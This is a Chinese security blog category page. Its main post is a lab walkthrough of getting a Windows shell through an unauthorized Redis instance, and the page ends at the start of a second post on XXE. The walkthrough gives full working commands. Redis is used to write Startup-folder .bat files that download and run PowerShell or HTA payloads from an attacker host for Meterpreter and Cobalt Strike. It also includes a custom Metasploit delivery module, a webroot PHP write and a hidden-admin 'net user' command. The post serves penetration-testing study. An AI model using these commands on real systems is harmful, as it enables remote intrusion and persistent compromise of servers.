<!doctype html>
<html lang="zh"><head><meta charset="utf-8"><meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1"><meta><title>分类: 漏洞复现 - B0urne &#039;s Blog</title><link rel="manifest" href="/manifest.json"><meta name="theme-color" content="red"><meta name="application-name" content="B0urne &#039;s Blog"><meta name="msapplication-TileImage" content="/img/favicon.jpg"><meta name="msapplication-TileColor" content="red"><meta name="apple-mobile-web-app-capable" content="yes"><meta name="apple-mobile-web-app-title" content="B0urne &#039;s Blog"><meta name="apple-mobile-web-app-status-bar-style" content="default"><meta name="description" content="Stay hungry, stay foolish."><meta property="og:type" content="blog"><meta property="og:title" content="B0urne &#039;s Blog"><meta property="og:url" content="http://b0u4ne.gihub.io/"><meta property="og:site_name" content="B0urne &#039;s Blog"><meta property="og:description" content="Stay hungry, stay foolish."><meta property="og:locale" content="zh_CN"><meta property="og:image" content="http://b0u4ne.gihub.io/img/og_image.png"><meta property="article:author" content="B0urne"><meta property="twitter:card" content="summary"><meta property="twitter:image" content="/img/og_image.png"><script type="application/ld+json">{"@context":"https://schema.org","@type":"BlogPosting","mainEntityOfPage":{"@type":"WebPage","@id":"http://b0u4ne.gihub.io"},"headline":"B0urne 's Blog","image":["http://b0u4ne.gihub.io/img/og_image.png"],"author":{"@type":"Person","name":"B0urne"},"description":"Stay hungry, stay foolish."}</script><link rel="icon" href="/img/favicon.jpg"><link rel="stylesheet" href="https://use.fontawesome.com/releases/v5.12.0/css/all.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/highlight.js@9.12.0/styles/atom-one-light.css"><link rel="stylesheet" href="https://fonts.googleapis.com/css2?family=Ubuntu:wght@400;600&amp;family=Source+Code+Pro"><link rel="stylesheet" href="/css/default.css"><style>body>.footer,body>.navbar,body>.section{opacity:0}</style><!--!--><!--!--><!--!--><script src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js" defer></script><!--!--><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/cookieconsent@3.1.1/build/cookieconsent.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/lightgallery@1.6.8/dist/css/lightgallery.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/justifiedGallery@3.7.0/dist/css/justifiedGallery.min.css"><!--!--><!--!--><script src="https://cdn.jsdelivr.net/npm/pace-js@1.0.2/pace.min.js"></script><!--!--><!--!--><script data-ad-client="11" src="https://pagead2.googlesyndication.com/pagead/js/adsbygoogle.js" async></script><meta name="generator" content="Hexo 5.3.0"></head><body class="is-2-column"><nav class="navbar navbar-main"><div class="container"><div class="navbar-brand justify-content-center"><a class="navbar-item navbar-logo" href="/"><img src="/img/logo2.png" alt="B0urne &#039;s Blog" height="28"></a></div><div class="navbar-menu"><div class="navbar-start"><a class="navbar-item" href="/">Home</a><a class="navbar-item" href="/archives">Archives</a><a class="navbar-item" href="/categories">Categories</a><a class="navbar-item" href="/tags">Tags</a><a class="navbar-item" href="/about">About</a></div><div class="navbar-end"><a class="navbar-item" target="_blank" rel="noopener" title="Download on GitHub" href="https://github.com/ppoffice/hexo-theme-icarus"><i class="fab fa-github"></i></a><a class="navbar-item search" title="搜索" href="javascript:;"><i class="fas fa-search"></i></a></div></div></div></nav><section class="section"><div class="container"><div class="columns"><div class="column order-2 column-main is-8-tablet is-8-desktop is-8-widescreen"><div class="card"><div class="card-content"><nav class="breadcrumb" aria-label="breadcrumbs"><ul><li><a href="/categories">分类</a></li><li class="is-active"><a href="#" aria-current="page">漏洞复现</a></li></ul></nav></div></div><div class="card"><article class="card-content article" role="article"><div class="article-meta is-size-7 is-uppercase level is-mobile"><div class="level-left"><span class="level-item"><time dateTime="2020-09-30T03:15:06.000Z" title="2020-9-30 11:15:06">2020-09-30</time>发表</span><span class="level-item"><time dateTime="2020-09-30T03:51:06.000Z" title="2020-9-30 11:51:06">2020-09-30</time>更新</span><span class="level-item"><a class="link-muted" href="/categories/recurrent/">漏洞复现</a></span><span class="level-item">13 分钟读完 (大约1932个字)</span></div></div><h1 class="title is-3 is-size-4-mobile"><a class="link-muted" href="/2020/09/30/Redis%E5%9C%A8windows%E7%8E%AF%E5%A2%83%E4%B8%8BGetshell%E6%96%B9%E6%B3%95%E5%B0%8F%E7%BB%93/">Redis在windows环境下Getshell方法小结</a></h1><div class="content"><h1 id="0x01-前言"><a href="#0x01-前言" class="headerlink" title="0x01 前言"></a><strong>0x01 前言</strong></h1><p><a target="_blank" rel="noopener" href="https://cloud.tencent.com/product/crs?from=10680">Redis</a>未授权访问漏洞很早之前就有了，在实战中如果遇到还是比较幸运的。比如挖到ssrf漏洞，如果内网有个未授权或者弱口令的redis，那么就可以深入的挖掘一下。 Redis如果部署在Linux服务器上还好一些，配合nc可以很方便的就拿到了shell。但是如果部署在Windows环境下就比较鸡肋了，虽是这样说，但是也有一些getshell的办法。</p>
<h1 id="0x02-环境搭建"><a href="#0x02-环境搭建" class="headerlink" title="0x02 环境搭建"></a><strong>0x02 环境搭建</strong></h1><p>系统环境：Windows Server 2012 Redis下载地址： <a target="_blank" rel="noopener" href="https://github.com/microsoftarchive/redis/releases/download/win-3.2.100/Redis-x64-3.2.100.msi">https://github.com/microsoftarchive/redis/releases/download/win-3.2.100/Redis-x64-3.2.100.msi</a></p>
<h1 id="0x03-靶机设置"><a href="#0x03-靶机设置" class="headerlink" title="0x03 靶机设置"></a><strong>0x03 靶机设置</strong></h1><h2 id="配置Redis"><a href="#配置Redis" class="headerlink" title="配置Redis"></a><strong>配置Redis</strong></h2><p>安装完Redis后它的服务就自动启动了，所以需要执行以下几步： 1.先停止Redis服务 <code>redis-server --service-stop</code> 2.更改配置文件 进入Redis的安装目录，然后修改windows.conf文件 第56行注释掉<code># bind 127.0.0.1</code>，第75行把<code>protected-mode yes</code>改成<code>protected-mode no</code> 这样就可以模拟未授权访问的Redis靶机。 3.卸载Redis服务 <code>redis-server --service-uninstall</code> 4.安装Redis服务 <code>redis-server --service-install redis.windows.conf</code> 5.启动redis <code>redis-server --service-start</code></p>
<h2 id="端口设置"><a href="#端口设置" class="headerlink" title="端口设置"></a><strong>端口设置</strong></h2><p>Redis默认端口是6379，所以你需要在windows的防火墙里开放6379端口，或者搭建靶机的时候直接就关闭防火墙。</p>
<h2 id="测试Redis未授权访问"><a href="#测试Redis未授权访问" class="headerlink" title="测试Redis未授权访问"></a><strong>测试Redis未授权访问</strong></h2><p>我是在Centos7上安装过Redis所以直接拿来用了。</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">[root@localhost src]# ./redis-cli -h 192.168.230.134</span><br><span class="line"><span class="number">192.168</span><span class="number">.230</span><span class="number">.134</span>:<span class="number">6379</span>&gt; ping</span><br><span class="line">PONG</span><br></pre></td></tr></table></figure>
<p><img src="/2020/09/30/Redis%E5%9C%A8windows%E7%8E%AF%E5%A2%83%E4%B8%8BGetshell%E6%96%B9%E6%B3%95%E5%B0%8F%E7%BB%93/l3d2ta4vbi.png?imageView2/2/w/1620" alt="img"></p>
<h2 id="配置Windows-server-2012"><a href="#配置Windows-server-2012" class="headerlink" title="配置Windows server 2012"></a><strong>配置Windows server 2012</strong></h2><p>测试过程中发现，默认是无法在启动项文件夹写文件的，需要把<code>C:\Users\Administrator</code>文件夹的组添加上<code>Everyone</code>并把权限改成完全控制，改完以后再测试就可以了。</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">192.168</span><span class="number">.230</span><span class="number">.134</span>:<span class="number">6379</span>&gt; config set dir <span class="string">&quot;C:/Users/Administrator/AppData/Roaming/Microsoft/Windows/Start Menu/Programs/startup/&quot;</span></span><br><span class="line">OK</span><br><span class="line"><span class="number">192.168</span><span class="number">.230</span><span class="number">.134</span>:<span class="number">6379</span>&gt;</span><br></pre></td></tr></table></figure>
<h1 id="0x04-几种Getshell方法"><a href="#0x04-几种Getshell方法" class="headerlink" title="0x04 几种Getshell方法"></a><strong>0x04 几种Getshell方法</strong></h1><p>方法其实挺多的，但是比较鸡肋，都需要目标主机重启才可以实现…</p>
<h2 id="一、利用powershell反弹shell"><a href="#一、利用powershell反弹shell" class="headerlink" title="一、利用powershell反弹shell"></a><strong>一、利用powershell反弹shell</strong></h2><p>1.用msfvenom生成shell.ps1文件</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=Kali的IP LPORT=<span class="number">4444</span> -f psh-reflection &gt;shell.ps1</span><br></pre></td></tr></table></figure>
<p>2.把shell.ps1文件复制到<code>/var/www/html/</code>目录下，然后启动apache2</p>
<p><img src="/2020/09/30/Redis%E5%9C%A8windows%E7%8E%AF%E5%A2%83%E4%B8%8BGetshell%E6%96%B9%E6%B3%95%E5%B0%8F%E7%BB%93/s11jhvhxdc.jpeg?imageView2/2/w/1620" alt="img"></p>
<p>3.用msf进行监听 设置payload的时候注意分清系统是32版本的还是64的。</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">msf5 &gt; use exploit/multi/handler</span><br><span class="line">msf5 exploit(multi/handler) &gt; set payload windows/x64/meterpreter/reverse_tcp</span><br><span class="line">payload =&gt; windows/x64/meterpreter/reverse_tcp</span><br><span class="line">msf5 exploit(multi/handler) &gt; set lhost <span class="number">192.168</span><span class="number">.230</span><span class="number">.133</span></span><br><span class="line">lhost =&gt; <span class="number">192.168</span><span class="number">.230</span><span class="number">.133</span></span><br><span class="line">msf5 exploit(multi/handler) &gt; set lport <span class="number">4444</span></span><br><span class="line">lport =&gt; <span class="number">4444</span></span><br><span class="line">msf5 exploit(multi/handler) &gt; run</span><br><span class="line"></span><br><span class="line">[*] Started reverse TCP handler on <span class="number">192.168</span><span class="number">.230</span><span class="number">.133</span>:<span class="number">4444</span></span><br></pre></td></tr></table></figure>
<p><img src="/2020/09/30/Redis%E5%9C%A8windows%E7%8E%AF%E5%A2%83%E4%B8%8BGetshell%E6%96%B9%E6%B3%95%E5%B0%8F%E7%BB%93/rca9dt9ui8.jpeg?imageView2/2/w/1620" alt="img"></p>
<p>4.利用Redis写入bat文件到启动项 注意<code>\r\n\r\n</code>代表换行的意思，因为用redis写的文件会自带一些版本信息，如果不换行可能会导致无法执行。反斜杠<code>\</code>可以转义你payload中的双引号<code>&quot;</code>。</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">192.168</span><span class="number">.230</span><span class="number">.134</span>:<span class="number">6379</span>&gt; config set dir <span class="string">&quot;C:/Users/Administrator/AppData/Roaming/Microsoft/Windows/Start Menu/Programs/startup/&quot;</span></span><br><span class="line">OK</span><br><span class="line"><span class="number">192.168</span><span class="number">.230</span><span class="number">.134</span>:<span class="number">6379</span>&gt; config set dbfilename shell.bat</span><br><span class="line">OK</span><br><span class="line"><span class="number">192.168</span><span class="number">.230</span><span class="number">.134</span>:<span class="number">6379</span>&gt; set x <span class="string">&quot;\r\n\r\npowershell -windowstyle hidden -exec bypass -c \&quot;IEX (New-Object Net.WebClient).DownloadString(&#x27;http://192.168.230.133/shell.ps1&#x27;);xx.ps1\&quot;\r\n\r\n&quot;</span></span><br><span class="line">OK</span><br><span class="line"><span class="number">192.168</span><span class="number">.230</span><span class="number">.134</span>:<span class="number">6379</span>&gt; save</span><br><span class="line">OK</span><br></pre></td></tr></table></figure>
<p>5.重启后得到shell</p>
<p><img src="/2020/09/30/Redis%E5%9C%A8windows%E7%8E%AF%E5%A2%83%E4%B8%8BGetshell%E6%96%B9%E6%B3%95%E5%B0%8F%E7%BB%93/is6wvc8khu.jpeg?imageView2/2/w/1620" alt="img"></p>
<h2 id="二、利用mshta-exe"><a href="#二、利用mshta-exe" class="headerlink" title="二、利用mshta.exe"></a><strong>二、利用mshta.exe</strong></h2><p>到<code>/usr/share/metasploit-framework/modules/exploits/windows</code>目录下创建一个msh_shell.rb文件，复制以下内容</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br></pre></td><td class="code"><pre><span class="line">##</span><br><span class="line"># This module requires Metasploit: https://metasploit.com/download</span><br><span class="line"># Current source: https://github.com/rapid7/metasploit-framework</span><br><span class="line">##</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">class MetasploitModule  &lt; Msf::Exploit::Remote</span><br><span class="line">  Rank = NormalRanking</span><br><span class="line"></span><br><span class="line">  include Msf::Exploit::Remote::HttpServer</span><br><span class="line"></span><br><span class="line">  def initialize(info  = &#123;&#125;)</span><br><span class="line">    <span class="built_in">super</span>(update_info(info,</span><br><span class="line">      <span class="string">&#x27;Name&#x27;</span> =&gt; <span class="string">&#x27;Microsoft Office Payload Delivery&#x27;</span>,</span><br><span class="line">      <span class="string">&#x27;Description&#x27;</span> =&gt; %q&#123;</span><br><span class="line">        This <span class="built_in">module</span> generates an command to place within</span><br><span class="line">        a word <span class="built_in">document</span>, that when executed, will retrieve a HTA payload</span><br><span class="line">        via HTTP <span class="keyword">from</span> an web server. Currently have not figured out how</span><br><span class="line">        to generate a doc.</span><br><span class="line">      &#125;,</span><br><span class="line">      <span class="string">&#x27;License&#x27;</span> =&gt; MSF_LICENSE,</span><br><span class="line">      <span class="string">&#x27;Arch&#x27;</span> =&gt; ARCH_X86,</span><br><span class="line">      <span class="string">&#x27;Platform&#x27;</span> =&gt; <span class="string">&#x27;win&#x27;</span>,</span><br><span class="line">      <span class="string">&#x27;Targets&#x27;</span> =&gt;</span><br><span class="line">        [</span><br><span class="line">          [<span class="string">&#x27;Automatic&#x27;</span>, &#123;&#125; ],</span><br><span class="line">        ],</span><br><span class="line">      <span class="string">&#x27;DefaultTarget&#x27;</span> =&gt; <span class="number">0</span>,</span><br><span class="line">    ))</span><br><span class="line">  end</span><br><span class="line"></span><br><span class="line">  def on_request_uri(cli, _request)</span><br><span class="line">    print_status(<span class="string">&quot;Delivering payload&quot;</span>)</span><br><span class="line">    p = regenerate_payload(cli)</span><br><span class="line">    data = Msf::Util::EXE.to_executable_fmt(</span><br><span class="line">      framework,</span><br><span class="line">      ARCH_X86,</span><br><span class="line">      <span class="string">&#x27;win&#x27;</span>,</span><br><span class="line">      p.encoded,</span><br><span class="line">      <span class="string">&#x27;hta-psh&#x27;</span>,</span><br><span class="line">      &#123; :<span class="function"><span class="params">arch</span> =&gt;</span> ARCH_X86, :<span class="function"><span class="params">platform</span> =&gt;</span> <span class="string">&#x27;win &#x27;</span>&#125;</span><br><span class="line">    )</span><br><span class="line">    send_response(cli, data, <span class="string">&#x27;Content-Type&#x27;</span> =&gt; <span class="string">&#x27;application/hta&#x27;</span>)</span><br><span class="line">  end</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">  def primer</span><br><span class="line">    url = get_uri</span><br><span class="line">    print_status(<span class="string">&quot;Place the following DDE in an MS document:&quot;</span>)</span><br><span class="line">    print_line(<span class="string">&quot;mshta.exe \&quot;#&#123;url&#125;\&quot;&quot;</span>)</span><br><span class="line">  end</span><br><span class="line">end</span><br></pre></td></tr></table></figure>
<p>然后在msf里重新加载所有模块：<code>reload_all</code> 找到之后就可以使用了</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">msf5 exploit(windows/msh_shell) &gt; set payload windows/meterpreter/reverse_tcp</span><br><span class="line">payload =&gt; windows/meterpreter/reverse_tcp</span><br><span class="line">msf5 exploit(windows/msh_shell) &gt; set lhost <span class="number">192.168</span><span class="number">.230</span><span class="number">.133</span></span><br><span class="line">lhost =&gt; <span class="number">192.168</span><span class="number">.230</span><span class="number">.133</span></span><br><span class="line">msf5 exploit(windows/msh_shell) &gt; set uripath shell</span><br><span class="line">uripath =&gt; shell</span><br><span class="line">msf5 exploit(windows/msh_shell) &gt; exploit</span><br><span class="line">zlib(finalizer): the stream was freed prematurely.</span><br><span class="line">[*] Exploit running <span class="keyword">as</span> background job <span class="number">0.</span></span><br><span class="line">[*] Exploit completed, but no session was created.</span><br><span class="line"></span><br><span class="line">[*] Started reverse TCP handler on <span class="number">192.168</span><span class="number">.230</span><span class="number">.133</span>:<span class="number">4444</span></span><br><span class="line">[*] Using URL: http:<span class="comment">//0.0.0.0:8080/shell</span></span><br><span class="line">[*] Local IP: http:<span class="comment">//192.168.230.133:8080/shell</span></span><br><span class="line">[*] Server started.</span><br><span class="line">[*] Place the following DDE <span class="keyword">in</span> an MS <span class="built_in">document</span>:</span><br><span class="line">mshta.exe <span class="string">&quot;http://192.168.230.133:8080/shell&quot;</span></span><br></pre></td></tr></table></figure>
<p>然后利用Redis写入bat文件到启动项</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">[root@localhost src]# ./redis-cli -h 192.168.230.134</span><br><span class="line"><span class="number">192.168</span><span class="number">.230</span><span class="number">.134</span>:<span class="number">6379</span>&gt; config set dir <span class="string">&quot;C:/Users/Administrator/AppData/Roaming/Microsoft/Windows/Start Menu/Programs/startup/&quot;</span></span><br><span class="line">OK</span><br><span class="line"><span class="number">192.168</span><span class="number">.230</span><span class="number">.134</span>:<span class="number">6379</span>&gt; config set dbfilename shell.bat</span><br><span class="line">OK</span><br><span class="line"><span class="number">192.168</span><span class="number">.230</span><span class="number">.134</span>:<span class="number">6379</span>&gt; set x <span class="string">&quot;\r\n\r\nmshta http://192.168.230.133:8080/shell\r\n\r\n&quot;</span></span><br><span class="line">OK</span><br><span class="line"><span class="number">192.168</span><span class="number">.230</span><span class="number">.134</span>:<span class="number">6379</span>&gt; save</span><br><span class="line">OK</span><br></pre></td></tr></table></figure>
<p><img src="/2020/09/30/Redis%E5%9C%A8windows%E7%8E%AF%E5%A2%83%E4%B8%8BGetshell%E6%96%B9%E6%B3%95%E5%B0%8F%E7%BB%93/lp74a3jllu.png?imageView2/2/w/1620" alt="img"></p>
<p>手动重启靶机就可以拿到session了</p>
<p><img src="/2020/09/30/Redis%E5%9C%A8windows%E7%8E%AF%E5%A2%83%E4%B8%8BGetshell%E6%96%B9%E6%B3%95%E5%B0%8F%E7%BB%93/hysopbpm1e.jpeg?imageView2/2/w/1620" alt="img"></p>
<h2 id="三、使用Cobalt-Strike"><a href="#三、使用Cobalt-Strike" class="headerlink" title="三、使用Cobalt Strike"></a><strong>三、使用Cobalt Strike</strong></h2><p>下载地址就不提供了，我是把Cobalt Strike的服务端脚本放到了kali上运行，然后客户端是在我本机(win10)运行的。</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">root@kali:/tools/cobaltctrike3.13-cracked# ./teamserver 192.168.230.133 233</span><br><span class="line">[*] Generating X509 certificate and keystore (<span class="keyword">for</span> SSL)</span><br><span class="line">[+] Team server is up on <span class="number">50050</span></span><br><span class="line">[*] SHA256 hash <span class="keyword">of</span> SSL cert is: 56b1896ec2bc1dfaab7445e7b9e63f30ab640e5a6180c2ac41de3d936da6c13b</span><br></pre></td></tr></table></figure>
<p>然后用客户端连接，用户名是msf，密码是233，端口具体看服务端返回的</p>
<p><img src="/2020/09/30/Redis%E5%9C%A8windows%E7%8E%AF%E5%A2%83%E4%B8%8BGetshell%E6%96%B9%E6%B3%95%E5%B0%8F%E7%BB%93/jzw3368m7f.png?imageView2/2/w/1620" alt="img"></p>
<p>创建一个listener，payload默认，端口自己设置</p>
<p><img src="/2020/09/30/Redis%E5%9C%A8windows%E7%8E%AF%E5%A2%83%E4%B8%8BGetshell%E6%96%B9%E6%B3%95%E5%B0%8F%E7%BB%93/837rwjm8ku.png?imageView2/2/w/1620" alt="img"></p>
<p>生成攻击脚本，注意端口别冲突</p>
<p><img src="/2020/09/30/Redis%E5%9C%A8windows%E7%8E%AF%E5%A2%83%E4%B8%8BGetshell%E6%96%B9%E6%B3%95%E5%B0%8F%E7%BB%93/8l6x1cyxkq.png?imageView2/2/w/1620" alt="img"></p>
<p><img src="/2020/09/30/Redis%E5%9C%A8windows%E7%8E%AF%E5%A2%83%E4%B8%8BGetshell%E6%96%B9%E6%B3%95%E5%B0%8F%E7%BB%93/94epdmohze.png?imageView2/2/w/1620" alt="img"></p>
<p>最后生成一串payload，用redis写一个bat脚本到启动项，然后等待目标重启即可</p>
<p><img src="/2020/09/30/Redis%E5%9C%A8windows%E7%8E%AF%E5%A2%83%E4%B8%8BGetshell%E6%96%B9%E6%B3%95%E5%B0%8F%E7%BB%93/1k66579h6t.png?imageView2/2/w/1620" alt="img"></p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">[root@localhost src]# ./redis-cli -h 192.168.230.134</span><br><span class="line"><span class="number">192.168</span><span class="number">.230</span><span class="number">.134</span>:<span class="number">6379</span>&gt; config set dir <span class="string">&quot;C:/Users/Administrator/AppData/Roaming/Microsoft/Windows/Start Menu/Programs/startup/&quot;</span></span><br><span class="line">OK</span><br><span class="line"><span class="number">192.168</span><span class="number">.230</span><span class="number">.134</span>:<span class="number">6379</span>&gt; config set dbfilename shell.bat</span><br><span class="line">OK</span><br><span class="line"><span class="number">192.168</span><span class="number">.230</span><span class="number">.134</span>:<span class="number">6379</span>&gt; set x <span class="string">&quot;\r\n\r\npowershell.exe -nop -w hidden -c \&quot;IEX ((new-object net.webclient).downloadstring(&#x27;http://192.168.230.133:80/a&#x27;))\&quot;\r\n\r\n&quot;</span></span><br><span class="line">OK</span><br><span class="line"><span class="number">192.168</span><span class="number">.230</span><span class="number">.134</span>:<span class="number">6379</span>&gt; save</span><br><span class="line">OK</span><br></pre></td></tr></table></figure>
<p>手动重启靶机后Cobalt Strike客户端里就看到有主机上线了~</p>
<p><img src="/2020/09/30/Redis%E5%9C%A8windows%E7%8E%AF%E5%A2%83%E4%B8%8BGetshell%E6%96%B9%E6%B3%95%E5%B0%8F%E7%BB%93/2qdy1ta4e9.png?imageView2/2/w/1620" alt="img"></p>
<h2 id="四、利用web服务"><a href="#四、利用web服务" class="headerlink" title="四、利用web服务"></a><strong>四、利用web服务</strong></h2><p>如果有Web业务的话，可以结合web业务进行Getshell。也是比较鸡肋，起码网站的根目录你得知道。</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">[root@localhost src]# ./redis-cli -h 192.168.230.134</span><br><span class="line"><span class="number">192.168</span><span class="number">.230</span><span class="number">.134</span>:<span class="number">6379</span>&gt; config set dir <span class="string">&quot;C:/phpstudy/WWW&quot;</span></span><br><span class="line">OK</span><br><span class="line"><span class="number">192.168</span><span class="number">.230</span><span class="number">.134</span>:<span class="number">6379</span>&gt; config set dbfilename phpinfo.php</span><br><span class="line">OK</span><br><span class="line"><span class="number">192.168</span><span class="number">.230</span><span class="number">.134</span>:<span class="number">6379</span>&gt; set x <span class="string">&quot;\r\n\r\n&lt;?php phpinfo();?&gt;\r\n\r\n&quot;</span></span><br><span class="line">OK</span><br><span class="line"><span class="number">192.168</span><span class="number">.230</span><span class="number">.134</span>:<span class="number">6379</span>&gt; save</span><br><span class="line">OK</span><br></pre></td></tr></table></figure>
<p><img src="/2020/09/30/Redis%E5%9C%A8windows%E7%8E%AF%E5%A2%83%E4%B8%8BGetshell%E6%96%B9%E6%B3%95%E5%B0%8F%E7%BB%93/2ozuqhauy5.jpeg?imageView2/2/w/1620" alt="img"></p>
<h1 id="0x05-一些思考"><a href="#0x05-一些思考" class="headerlink" title="0x05 一些思考"></a><strong>0x05 一些思考</strong></h1><p>在真实环境中确实遇到了几个可以访问启动目录的系统，在测试的过程中，如果安装了安全软件也是可以拿到shell的。还有就是不知道如果开了3389端口的情况下，如果直接执行<code>net user test$ xxxxxx /add &amp; net localgroup administrators test$ /add</code>这种命令会怎样？本地靶机测试是可以的。如果遇到server 2003的系统，可以用写MOF的方法拿shell。真实的业务环境还是很复杂，但是方法总比困难多。总结的不是很全面，有哪些老哥有好的思路欢迎一起交流。</p>
<h1 id="0x06-参考链接"><a href="#0x06-参考链接" class="headerlink" title="0x06 参考链接"></a><strong>0x06 参考链接</strong></h1><blockquote>
<p><a target="_blank" rel="noopener" href="https://uknowsec.cn/posts/notes/Redis%E5%9C%A8Windows%E7%8E%AF%E5%A2%83%E4%B8%8BGetshell.html">https://uknowsec.cn/posts/notes/Redis%E5%9C%A8Windows%E7%8E%AF%E5%A2%83%E4%B8%8BGetshell.html</a> <a target="_blank" rel="noopener" href="https://blog.csdn.net/weixin_33928467/article/details/86254639">https://blog.csdn.net/weixin_33928467/article/details/86254639</a></p>
</blockquote>
<p>本文分享自微信公众号 - 渗透云笔记（shentouyun）</p>
</div></article></div><div class="card"><article class="card-content article" role="article"><div class="article-meta is-size-7 is-uppercase level is-mobile"><div class="level-left"><span class="level-item"><time dateTime="2020-09-11T02:31:21.000Z" title="2020-9-11 10:31:21">2020-09-11</time>发表</span><span class="level-item"><time dateTime="2020-09-11T08:46:20.000Z" title="2020-9-11 16:46:20">2020-09-11</time>更新</span><span class="level-item"><a class="link-muted" href="/categories/recurrent/">漏洞复现</a></span><span class="level-item">28 分钟读完 (大约4220个字)</span></div></div><h1 class="title is-3 is-size-4-mobile"><a class="link-muted" href="/2020/09/11/web%E6%B8%97%E9%80%8F/XXE%E6%BC%8F%E6%B4%9E/">XXE漏洞</a></h1><div class="content"><h1 id="0x00-XML"><a href="#0x00-XML" class="headerlink" title="0x00 XML"></a>0x00 XML</h1><p>这次的漏洞是XXE漏洞，全称叫：XML 外部实体注入（XML External Entity Injection）。</p>
<p>首先是XML，XML 是一种标记语言，可以用来定义数据类型，定义好的数据可以方便的在系统间传输和使用。</p>
<p>XML被设计为传输和存储数据，其焦点是数据的内容，目的是把数据从HTML分离，是独立于软件和硬件的信息传输工具。XML文档有自己的一个格式规范，这个格式规范是由一个叫做DTD（document type definition）的东西控制的</p>
<p>如下一个XML文档，它的结构可以分为XML声明、文档类型定义（DTD）、文档元素，其中DTD 是可选的，这次漏洞就是在解析DTD 时产生的。DOCTYPE是DTD的声明，ENTITY是实体的声明，SYSTEM、PUBLIC是外部资源的申请。</p>
